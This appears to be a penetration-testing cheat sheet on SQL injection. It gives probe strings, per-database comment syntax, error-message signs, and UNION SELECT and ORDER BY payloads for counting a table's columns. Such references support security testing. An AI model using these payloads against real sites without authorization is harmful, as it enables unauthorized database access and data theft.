# SQL Injection Cheat Sheet

## 1. Generate a SQL Error:

* Insert 1 quote: `'`
* Insert 2 single quotes: `''`
* Compare the difference. \(also try with `"` if single quotes have no effect\)

## 2. Testing for Equivalent Expressions

### Equivalent Strings

* Initial String:  `name`
* Orcale:  `na'||'me`
* SQL Server:  `na'%2b'me  --or--  na'+'me`
* MySQL:  `na' 'me`

### Equivalent Integers

* Initial Query:  `?id=2`
* Tests:  

```text
?id=3-1
?id=2-0
?id=1+1  --or--  ?id=1%2b1
```

## Testing Logic Operations

* Initial Query:

```text
?id=2
- or -
?name=test
```

* Tests:

```text
?id=2 and 1=1
?id=2 and 1=0

?name=test' and '1'='1
?name=test' and '1'='0
```

## Commenting Out End of Query

Oracle:

```text
--%20
(%20 is a space ' ')
```

MSSQL:

```text
--%20
```

MySQL:

```text
--%20
#
/*
```

## Error Messages

### SQL Injection NOT Likely

```text
# Returned Error Message:
java.lang.NumberFormatException\:For input string\:
```

### SQL Injection IS Likely

```text
...:quoted string is not properly terminated.
```

## Targeting By Action of Query

Look through the possible SQL injection points found so far and prioritize them based on the action performed by the SQL query.

\(\#1 is top priority\)

1. SELECT
2. INSERT
3. UPDATE
4. DELETE

## Exploitation

### Using UNION SELECT

```text
?id=1 union select 1
?id=1 union select 1,2
?id=1 union select 1,2,3

# Continue until no error is returned
```

### Using ORDER BY

```text
?id=1 order by 1
...
?id=1 order by 9
?id=1 order by 10  --> ERROR

# In the above example the table has 9 columns.

# The number of columns in the table will be the last query
# before you get an error.
```

